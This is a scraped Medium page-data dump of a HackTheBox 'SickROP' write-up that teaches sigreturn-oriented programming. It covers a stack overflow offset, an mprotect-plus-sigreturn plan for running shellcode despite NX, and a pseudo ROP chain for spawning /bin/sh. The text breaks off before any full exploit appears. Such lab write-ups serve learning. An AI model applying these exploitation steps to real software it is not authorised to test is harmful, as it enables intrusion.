b":"89dd2f","alpha":"ff"},"nameTreatment":"NAME_TREATMENT_TEXT","postNameTreatment":"NAME_TREATMENT_LOGO","logoImage":null,"logoScale":"HEADER_SCALE_LARGE","taglineColor":{"__typename":"ColorValue","rgb":"89dd2f","alpha":"ff"},"taglineTreatment":"TAGLINE_TREATMENT_SIDEBAR"},"postBody":null,"navigation":null},"ImageMetadata:1*T4KikCjZBOeUAsRxS8e3hQ.jpeg":{"id":"1*T4KikCjZBOeUAsRxS8e3hQ.jpeg","__typename":"ImageMetadata","originalWidth":3000},"UserViewerEdge:userId:ec69897f3ac2-viewerId:ec69897f3ac2":{"id":"userId:ec69897f3ac2-viewerId:ec69897f3ac2","__typename":"UserViewerEdge","createdAt":1614078961137,"lastPostCreatedAt":1633104671810,"isFollowing":false,"isUser":true},"NewsletterV3:c8e0e297b508":{"id":"c8e0e297b508","__typename":"NewsletterV3","type":"NEWSLETTER_TYPE_AUTHOR","slug":"ec69897f3ac2","name":"ec69897f3ac2","collection":null,"user":{"__ref":"User:ec69897f3ac2"},"description":"","promoHeadline":"","promoBody":"","replyToEmail":"","showPromo":false,"subscribersCount":1},"Post:8b27727cd441":{"id":"8b27727cd441","__typename":"Post","creator":{"__ref":"User:ec69897f3ac2"},"canonicalUrl":"","collection":null,"content({\"postMeteringOptions\":{\"referrer\":\"https:\u002F\u002Fmedium.com\u002Fp\u002F8b27727cd441\u002Fedit\",\"sk\":null,\"source\":null}})":{"__typename":"PostContent","isLockedPreviewOnly":false,"validatedShareKey":"","bodyModel":{"__typename":"RichText","paragraphs":[{"__ref":"Paragraph:1ea4f27dbd72_0"},{"__ref":"Paragraph:1ea4f27dbd72_1"},{"__ref":"Paragraph:1ea4f27dbd72_2"},{"__ref":"Paragraph:1ea4f27dbd72_3"},{"__ref":"Paragraph:1ea4f27dbd72_4"},{"__ref":"Paragraph:1ea4f27dbd72_5"},{"__ref":"Paragraph:1ea4f27dbd72_6"},{"__ref":"Paragraph:1ea4f27dbd72_7"},{"__ref":"Paragraph:1ea4f27dbd72_8"},{"__ref":"Paragraph:1ea4f27dbd72_9"},{"__ref":"Paragraph:1ea4f27dbd72_10"},{"__ref":"Paragraph:1ea4f27dbd72_11"},{"__ref":"Paragraph:1ea4f27dbd72_12"},{"__ref":"Paragraph:1ea4f27dbd72_13"},{"__ref":"Paragraph:1ea4f27dbd72_14"},{"__ref":"Paragraph:1ea4f27dbd72_15"},{"__ref":"Paragraph:1ea4f27dbd72_16"},{"__ref":"Paragraph:1ea4f27dbd72_17"},{"__ref":"Paragraph:1ea4f27dbd72_18"},{"__ref":"Paragraph:1ea4f27dbd72_19"},{"__ref":"Paragraph:1ea4f27dbd72_20"},{"__ref":"Paragraph:1ea4f27dbd72_21"},{"__ref":"Paragraph:1ea4f27dbd72_22"},{"__ref":"Paragraph:1ea4f27dbd72_23"},{"__ref":"Paragraph:1ea4f27dbd72_24"},{"__ref":"Paragraph:1ea4f27dbd72_25"},{"__ref":"Paragraph:1ea4f27dbd72_26"},{"__ref":"Paragraph:1ea4f27dbd72_27"},{"__ref":"Paragraph:1ea4f27dbd72_28"},{"__ref":"Paragraph:1ea4f27dbd72_29"},{"__ref":"Paragraph:1ea4f27dbd72_30"},{"__ref":"Paragraph:1ea4f27dbd72_31"},{"__ref":"Paragraph:1ea4f27dbd72_32"},{"__ref":"Paragraph:1ea4f27dbd72_33"},{"__ref":"Paragraph:1ea4f27dbd72_34"},{"__ref":"Paragraph:1ea4f27dbd72_35"},{"__ref":"Paragraph:1ea4f27dbd72_36"},{"__ref":"Paragraph:1ea4f27dbd72_37"},{"__ref":"Paragraph:1ea4f27dbd72_38"},{"__ref":"Paragraph:1ea4f27dbd72_39"},{"__ref":"Paragraph:1ea4f27dbd72_40"},{"__ref":"Paragraph:1ea4f27dbd72_41"},{"__ref":"Paragraph:1ea4f27dbd72_42"},{"__ref":"Paragraph:1ea4f27dbd72_43"},{"__ref":"Paragraph:1ea4f27dbd72_44"},{"__ref":"Paragraph:1ea4f27dbd72_45"},{"__ref":"Paragraph:1ea4f27dbd72_46"},{"__ref":"Paragraph:1ea4f27dbd72_47"},{"__ref":"Paragraph:1ea4f27dbd72_48"},{"__ref":"Paragraph:1ea4f27dbd72_49"},{"__ref":"Paragraph:1ea4f27dbd72_50"},{"__ref":"Paragraph:1ea4f27dbd72_51"},{"__ref":"Paragraph:1ea4f27dbd72_52"},{"__ref":"Paragraph:1ea4f27dbd72_53"},{"__ref":"Paragraph:1ea4f27dbd72_54"},{"__ref":"Paragraph:1ea4f27dbd72_55"},{"__ref":"Paragraph:1ea4f27dbd72_56"},{"__ref":"Paragraph:1ea4f27dbd72_57"},{"__ref":"Paragraph:1ea4f27dbd72_58"},{"__ref":"Paragraph:1ea4f27dbd72_59"},{"__ref":"Paragraph:1ea4f27dbd72_60"},{"__ref":"Paragraph:1ea4f27dbd72_61"},{"__ref":"Paragraph:1ea4f27dbd72_62"},{"__ref":"Paragraph:1ea4f27dbd72_63"},{"__ref":"Paragraph:1ea4f27dbd72_64"},{"__ref":"Paragraph:1ea4f27dbd72_65"},{"__ref":"Paragraph:1ea4f27dbd72_66"},{"__ref":"Paragraph:1ea4f27dbd72_67"},{"__ref":"Paragraph:1ea4f27dbd72_68"},{"__ref":"Paragraph:1ea4f27dbd72_69"},{"__ref":"Paragraph:1ea4f27dbd72_70"},{"__ref":"Paragraph:1ea4f27dbd72_71"},{"__ref":"Paragraph:1ea4f27dbd72_72"},{"__ref":"Paragraph:1ea4f27dbd72_73"},{"__ref":"Paragraph:1ea4f27dbd72_74"},{"__ref":"Paragraph:1ea4f27dbd72_75"},{"__ref":"Paragraph:1ea4f27dbd72_76"},{"__ref":"Paragraph:1ea4f27dbd72_77"},{"__ref":"Paragraph:1ea4f27dbd72_78"},{"__ref":"Paragraph:1ea4f27dbd72_79"},{"__ref":"Paragraph:1ea4f27dbd72_80"},{"__ref":"Paragraph:1ea4f27dbd72_81"},{"__ref":"Paragraph:1ea4f27dbd72_82"},{"__ref":"Paragraph:1ea4f27dbd72_83"},{"__ref":"Paragraph:1ea4f27dbd72_84"},{"__ref":"Paragraph:1ea4f27dbd72_85"},{"__ref":"Paragraph:1ea4f27dbd72_86"},{"__ref":"Paragraph:1ea4f27dbd72_87"},{"__ref":"Paragraph:1ea4f27dbd72_88"},{"__ref":"Paragraph:1ea4f27dbd72_89"},{"__ref":"Paragraph:1ea4f27dbd72_90"},{"__ref":"Paragraph:1ea4f27dbd72_91"},{"__ref":"Paragraph:1ea4f27dbd72_92"},{"__ref":"Paragraph:1ea4f27dbd72_93"},{"__ref":"Paragraph:1ea4f27dbd72_94"},{"__ref":"Paragraph:1ea4f27dbd72_95"},{"__ref":"Paragraph:1ea4f27dbd72_96"},{"__ref":"Paragraph:1ea4f27dbd72_97"},{"__ref":"Paragraph:1ea4f27dbd72_98"},{"__ref":"Paragraph:1ea4f27dbd72_99"}],"sections":[{"__typename":"Section","name":"6fb2","startIndex":0,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null}]}},"customStyleSheet":{"__ref":"CustomStyleSheet:64a7b5dd3aa7"},"firstPublishedAt":1634224521742,"isLocked":false,"isPublished":true,"isShortform":false,"layerCake":0,"primaryTopic":null,"title":"SickROP — Hackthebox (Introduction to Sigreturn Oriented Programming\u002FSROP)","isMarkedPaywallOnly":false,"mediumUrl":"https:\u002F\u002Fcorruptedprotocol.medium.com\u002Fsickrop-hackthebox-introduction-to-sigreturn-oriented-programming-srop-8b27727cd441","isLimitedState":false,"inResponseToPostResult":null,"inResponseToCatalogResult":null,"visibility":"PUBLIC","license":"ALL_RIGHTS_RESERVED","allowResponses":true,"newsletterId":"17b9695cc3c9","sequence":null,"tags":[{"__ref":"Tag:cybersecurity"},{"__ref":"Tag:hackthebox"},{"__ref":"Tag:hackthebox-writeup"},{"__ref":"Tag:srop"},{"__ref":"Tag:sigrop"}],"topics":[],"isNewsletter":false,"isPublishToEmail":true,"socialTitle":"","socialDek":"","noIndex":null,"curationStatus":"CURATION_STATUS_DISABLED","metaDescription":"","latestPublishedAt":1634224521742,"readingTime":7.450943396226415,"previewContent":{"__typename":"PreviewContent","subtitle":"INTRODUCTION"},"previewImage":{"__ref":"ImageMetadata:1*sy8HBkyGs-6MKI_GIckiCA.png"},"clapCount":0,"postResponses":{"__typename":"PostResponses","count":0},"isSuspended":false,"pendingCollection":null,"statusForCollection":null,"lockedSource":"LOCKED_POST_SOURCE_NONE","pinnedAt":0,"pinnedByCreatorAt":0,"curationEligibleAt":0,"responseDistribution":"NOT_DISTRIBUTED","viewerEdge":{"__ref":"PostViewerEdge:postId:8b27727cd441-viewerId:ec69897f3ac2"},"collaborators":[],"translationSourcePost":null,"inResponseToMediaResource":null,"audioVersionUrl":"","seoTitle":"","updatedAt":1634224521954,"shortformType":"SHORTFORM_TYPE_LINK","structuredData":"","seoDescription":"","isIndexable":true,"latestPublishedVersion":"1ea4f27dbd72","voterCount":0,"recommenders":[],"content({})":{"__typename":"PostContent","isLockedPreviewOnly":false,"validatedShareKey":"","bodyModel":{"__typename":"RichText","paragraphs":[{"__ref":"Paragraph:1ea4f27dbd72_0"},{"__ref":"Paragraph:1ea4f27dbd72_1"},{"__ref":"Paragraph:1ea4f27dbd72_2"},{"__ref":"Paragraph:1ea4f27dbd72_3"},{"__ref":"Paragraph:1ea4f27dbd72_4"},{"__ref":"Paragraph:1ea4f27dbd72_5"},{"__ref":"Paragraph:1ea4f27dbd72_6"},{"__ref":"Paragraph:1ea4f27dbd72_7"},{"__ref":"Paragraph:1ea4f27dbd72_8"},{"__ref":"Paragraph:1ea4f27dbd72_9"},{"__ref":"Paragraph:1ea4f27dbd72_10"},{"__ref":"Paragraph:1ea4f27dbd72_11"},{"__ref":"Paragraph:1ea4f27dbd72_12"},{"__ref":"Paragraph:1ea4f27dbd72_13"},{"__ref":"Paragraph:1ea4f27dbd72_14"},{"__ref":"Paragraph:1ea4f27dbd72_15"},{"__ref":"Paragraph:1ea4f27dbd72_16"},{"__ref":"Paragraph:1ea4f27dbd72_17"},{"__ref":"Paragraph:1ea4f27dbd72_18"},{"__ref":"Paragraph:1ea4f27dbd72_19"},{"__ref":"Paragraph:1ea4f27dbd72_20"},{"__ref":"Paragraph:1ea4f27dbd72_21"},{"__ref":"Paragraph:1ea4f27dbd72_22"},{"__ref":"Paragraph:1ea4f27dbd72_23"},{"__ref":"Paragraph:1ea4f27dbd72_24"},{"__ref":"Paragraph:1ea4f27dbd72_25"},{"__ref":"Paragraph:1ea4f27dbd72_26"},{"__ref":"Paragraph:1ea4f27dbd72_27"},{"__ref":"Paragraph:1ea4f27dbd72_28"},{"__ref":"Paragraph:1ea4f27dbd72_29"},{"__ref":"Paragraph:1ea4f27dbd72_30"},{"__ref":"Paragraph:1ea4f27dbd72_31"},{"__ref":"Paragraph:1ea4f27dbd72_32"},{"__ref":"Paragraph:1ea4f27dbd72_33"},{"__ref":"Paragraph:1ea4f27dbd72_34"},{"__ref":"Paragraph:1ea4f27dbd72_35"},{"__ref":"Paragraph:1ea4f27dbd72_36"},{"__ref":"Paragraph:1ea4f27dbd72_37"},{"__ref":"Paragraph:1ea4f27dbd72_38"},{"__ref":"Paragraph:1ea4f27dbd72_39"},{"__ref":"Paragraph:1ea4f27dbd72_40"},{"__ref":"Paragraph:1ea4f27dbd72_41"},{"__ref":"Paragraph:1ea4f27dbd72_42"},{"__ref":"Paragraph:1ea4f27dbd72_43"},{"__ref":"Paragraph:1ea4f27dbd72_44"},{"__ref":"Paragraph:1ea4f27dbd72_45"},{"__ref":"Paragraph:1ea4f27dbd72_46"},{"__ref":"Paragraph:1ea4f27dbd72_47"},{"__ref":"Paragraph:1ea4f27dbd72_48"},{"__ref":"Paragraph:1ea4f27dbd72_49"},{"__ref":"Paragraph:1ea4f27dbd72_50"},{"__ref":"Paragraph:1ea4f27dbd72_51"},{"__ref":"Paragraph:1ea4f27dbd72_52"},{"__ref":"Paragraph:1ea4f27dbd72_53"},{"__ref":"Paragraph:1ea4f27dbd72_54"},{"__ref":"Paragraph:1ea4f27dbd72_55"},{"__ref":"Paragraph:1ea4f27dbd72_56"},{"__ref":"Paragraph:1ea4f27dbd72_57"},{"__ref":"Paragraph:1ea4f27dbd72_58"},{"__ref":"Paragraph:1ea4f27dbd72_59"},{"__ref":"Paragraph:1ea4f27dbd72_60"},{"__ref":"Paragraph:1ea4f27dbd72_61"},{"__ref":"Paragraph:1ea4f27dbd72_62"},{"__ref":"Paragraph:1ea4f27dbd72_63"},{"__ref":"Paragraph:1ea4f27dbd72_64"},{"__ref":"Paragraph:1ea4f27dbd72_65"},{"__ref":"Paragraph:1ea4f27dbd72_66"},{"__ref":"Paragraph:1ea4f27dbd72_67"},{"__ref":"Paragraph:1ea4f27dbd72_68"},{"__ref":"Paragraph:1ea4f27dbd72_69"},{"__ref":"Paragraph:1ea4f27dbd72_70"},{"__ref":"Paragraph:1ea4f27dbd72_71"},{"__ref":"Paragraph:1ea4f27dbd72_72"},{"__ref":"Paragraph:1ea4f27dbd72_73"},{"__ref":"Paragraph:1ea4f27dbd72_74"},{"__ref":"Paragraph:1ea4f27dbd72_75"},{"__ref":"Paragraph:1ea4f27dbd72_76"},{"__ref":"Paragraph:1ea4f27dbd72_77"},{"__ref":"Paragraph:1ea4f27dbd72_78"},{"__ref":"Paragraph:1ea4f27dbd72_79"},{"__ref":"Paragraph:1ea4f27dbd72_80"},{"__ref":"Paragraph:1ea4f27dbd72_81"},{"__ref":"Paragraph:1ea4f27dbd72_82"},{"__ref":"Paragraph:1ea4f27dbd72_83"},{"__ref":"Paragraph:1ea4f27dbd72_84"},{"__ref":"Paragraph:1ea4f27dbd72_85"},{"__ref":"Paragraph:1ea4f27dbd72_86"},{"__ref":"Paragraph:1ea4f27dbd72_87"},{"__ref":"Paragraph:1ea4f27dbd72_88"},{"__ref":"Paragraph:1ea4f27dbd72_89"},{"__ref":"Paragraph:1ea4f27dbd72_90"},{"__ref":"Paragraph:1ea4f27dbd72_91"},{"__ref":"Paragraph:1ea4f27dbd72_92"},{"__ref":"Paragraph:1ea4f27dbd72_93"},{"__ref":"Paragraph:1ea4f27dbd72_94"},{"__ref":"Paragraph:1ea4f27dbd72_95"},{"__ref":"Paragraph:1ea4f27dbd72_96"},{"__ref":"Paragraph:1ea4f27dbd72_97"},{"__ref":"Paragraph:1ea4f27dbd72_98"},{"__ref":"Paragraph:1ea4f27dbd72_99"}],"sections":[{"__typename":"Section","name":"6fb2","startIndex":0,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null}]}},"internalLinks({\"paging\":{\"limit\":8}})":{"__typename":"InternalLinksConnection","items":[]}},"Paragraph:1ea4f27dbd72_0":{"id":"1ea4f27dbd72_0","__typename":"Paragraph","name":"5ce7","text":"SickROP — Hackthebox (Introduction to Sigreturn Oriented Programming\u002FSROP)","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_1":{"id":"1ea4f27dbd72_1","__typename":"Paragraph","name":"811a","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*sy8HBkyGs-6MKI_GIckiCA.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_2":{"id":"1ea4f27dbd72_2","__typename":"Paragraph","name":"fc72","text":"INTRODUCTION","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_3":{"id":"1ea4f27dbd72_3","__typename":"Paragraph","name":"1bd6","text":"Hello PWN enthusiasts, we will do a technique called Sigreturn oriented programming\u002FSROP to complete this challenge. I’ll explain everything in SROP while doing the Sickrop challenge. Skip to the challenge section if you know about the basics of SIGRETURN.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_4":{"id":"1ea4f27dbd72_4","__typename":"Paragraph","name":"d01a","text":"NOTE: I am using the mprotect() method in this blog. I’ll probably put a blog on the sys_execve() method later :)","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_5":{"id":"1ea4f27dbd72_5","__typename":"Paragraph","name":"615e","text":"WHY SIGRETURN?","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_6":{"id":"1ea4f27dbd72_6","__typename":"Paragraph","name":"9749","text":"So why do we learn a new attack? Couldn’t we use normal ROP to finish the challenge?","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_7":{"id":"1ea4f27dbd72_7","__typename":"Paragraph","name":"2635","text":"64-bit binary has some calling conventions for every function. The parameters to the function need to be loaded into registers before the function is called. For example, when there is a system call, We load “\u002Fbin\u002Fsh” or “\u002Fbin\u002Fbash” as a pointer to the RDI register. Then we call the system call. This will pop us a shell as expected.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_8":{"id":"1ea4f27dbd72_8","__typename":"Paragraph","name":"41cd","text":"pop rdi;\n*pointer to \u002Fbin\u002Fsh*\nsystem call","type":"PRE","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_9":{"id":"1ea4f27dbd72_9","__typename":"Paragraph","name":"cb8f","text":"This is a basic ROP chain that we usually use when we have pop rdi. But let us see what Sickrop binary has. I am using ROPgadget for listing out all the gadgets this binary has.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_10":{"id":"1ea4f27dbd72_10","__typename":"Paragraph","name":"3462","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*VtUlsnaISQBtkpytnBBgbw.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_11":{"id":"1ea4f27dbd72_11","__typename":"Paragraph","name":"0c20","text":"We have only 16 gadgets available :( We do not have a pop rdi. So how do we execute system call.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_12":{"id":"1ea4f27dbd72_12","__typename":"Paragraph","name":"d74a","text":"We could use syscall to perform an sys_execve(). For this I will be using the Linux syscall table to find what parameters I need to call sys_execve().","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_13":{"id":"1ea4f27dbd72_13","__typename":"Paragraph","name":"38ec","text":"https:\u002F\u002Fblog.rchapman.org\u002Fposts\u002FLinux_System_Call_Table_for_x86_64\u002F","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":0,"end":67,"type":"A","href":"https:\u002F\u002Fblog.rchapman.org\u002Fposts\u002FLinux_System_Call_Table_for_x86_64\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:1ea4f27dbd72_14":{"id":"1ea4f27dbd72_14","__typename":"Paragraph","name":"ae4c","text":"If you find for sys_execve there are a lot of parameters to pass before we call this function. I’ll make your life easier.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_15":{"id":"1ea4f27dbd72_15","__typename":"Paragraph","name":"6727","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*IqO_Mw8y7gIqJflrTpwVlw.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_16":{"id":"1ea4f27dbd72_16","__typename":"Paragraph","name":"9efd","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*qhZvkVwfgaKN1hawRYtIwQ.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_17":{"id":"1ea4f27dbd72_17","__typename":"Paragraph","name":"2660","text":"So we need to set RAX = 59 and RDI to the pointer “\u002Fbin\u002Fsh”. But again we do not have a pop RAX or pop RDI to perform this for us. What do we do ??","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_18":{"id":"1ea4f27dbd72_18","__typename":"Paragraph","name":"6eab","text":"And that’s where Sigreturn comes in place. We can pop out shellcode with only 2 gadgets!!!","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_19":{"id":"1ea4f27dbd72_19","__typename":"Paragraph","name":"1b1b","text":"WHAT IS SIGRETURN ?","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_20":{"id":"1ea4f27dbd72_20","__typename":"Paragraph","name":"85b6","text":"Sigreturn uses a signal handler to clean up the stack frame after a signal is triggered.","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":0,"end":88,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:1ea4f27dbd72_21":{"id":"1ea4f27dbd72_21","__typename":"Paragraph","name":"e3d3","text":"It also uses temporarily stored data such as registers on the stack to perform a task. We could set the value of registers using the pwntool built-in function. This could be done manually, But that is hectic as all the register values have to be sent manually even though they are not needed. But what to set the register values as? We will use the concept of sys_mprotect() here.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_22":{"id":"1ea4f27dbd72_22","__typename":"Paragraph","name":"ff8b","text":"sys_mprotect() makes a memory segment with a fixed address writable and executable.","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":0,"end":12,"type":"A","href":"https:\u002F\u002Fman7.org\u002Flinux\u002Fman-pages\u002Fman2\u002Fmprotect.2.html","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","start":0,"end":83,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:1ea4f27dbd72_23":{"id":"1ea4f27dbd72_23","__typename":"Paragraph","name":"ce67","text":"Imagine doing this! You could execute a shellcode from your stack even if NX bit is enabled! And that's exactly what we are going to do in this challenge.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_24":{"id":"1ea4f27dbd72_24","__typename":"Paragraph","name":"0fd8","text":"HOW TO SOLVE THIS CHALLENGE ?","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_25":{"id":"1ea4f27dbd72_25","__typename":"Paragraph","name":"323e","text":"First we set the register value to call the sys_mprotect. Then we trigger the sys_rt_sigreturn. Now we would have a stack which is executable. So we could inject a shellcode in the buffer and then return to this shellcode from the RIP region.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_26":{"id":"1ea4f27dbd72_26","__typename":"Paragraph","name":"3bf4","text":"CHALLENGE","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_27":{"id":"1ea4f27dbd72_27","__typename":"Paragraph","name":"ad12","text":"We start with checking the file type and memory protections involved with the binary","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_28":{"id":"1ea4f27dbd72_28","__typename":"Paragraph","name":"603b","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*hKlVnyNpD-qd8sNuonuIsw.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_29":{"id":"1ea4f27dbd72_29","__typename":"Paragraph","name":"171e","text":"This is an ASM code directly compiled and is statically linked. Only NX and ASLR(Default) is enabled. So we cannot execute the shellcode without changing the stack as executable.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_30":{"id":"1ea4f27dbd72_30","__typename":"Paragraph","name":"ea55","text":"Lets see the entire code with objdump.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_31":{"id":"1ea4f27dbd72_31","__typename":"Paragraph","name":"6128","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*qMAmVVx99bZ3wicWMyiSzA.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_32":{"id":"1ea4f27dbd72_32","__typename":"Paragraph","name":"cdb6","text":"Let us analyze the code fully before we dive into exploiting it. The entry point is the _start, just like our main() in c code. From here, it calls the vuln() function. In the vuln() function there is a call to the read function. In the read function, the RAX(it is denoted as EAX here) gets the value 0. In the Linux Syscall table, 0 is for the read. After that, some parameters are passed and then Syscall is been called. So if you understood this part you can proceed further.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_33":{"id":"1ea4f27dbd72_33","__typename":"Paragraph","name":"38aa","text":"Now, let’s start building up our exploit. We need to find the overflow offset. For this let’s use gdb to find it out for us.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_34":{"id":"1ea4f27dbd72_34","__typename":"Paragraph","name":"0825","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*RL4cAi9PpHF1QfGdz3oObg.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_35":{"id":"1ea4f27dbd72_35","__typename":"Paragraph","name":"d99e","text":"As this is a 64bit binary, We need to look at what the RBP is overwritten with and then add 8 bytes to it to get to the RIP\u002FReturn region.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_36":{"id":"1ea4f27dbd72_36","__typename":"Paragraph","name":"3480","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*IFXEa_Et85SV6AlA1sBC4Q.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_37":{"id":"1ea4f27dbd72_37","__typename":"Paragraph","name":"e28f","text":"We can see the RBP is overwritten with “iaaajaaa”","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_38":{"id":"1ea4f27dbd72_38","__typename":"Paragraph","name":"4bf7","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*EqkGfMk-rgMp7wcL9ewbQQ.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_39":{"id":"1ea4f27dbd72_39","__typename":"Paragraph","name":"6da6","text":"So 32 + 8 is the overflow offset here.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ea4f27dbd72_40":{"id":"1ea4f27dbd72_40","__typename":"Paragraph","name":"a683","text":"Next, we come to the main concept, Sigreturn. We use the mprotect first to make a memory segment writeable. Then we Call the sigreturn handler and then place our shellcode into the buffer and execute it. \nFirst, let us find a writable memory segment. I am opening ghidra for this. Ghidra kinda gives us an idea about where this binary starts. There is a prompt when we import the 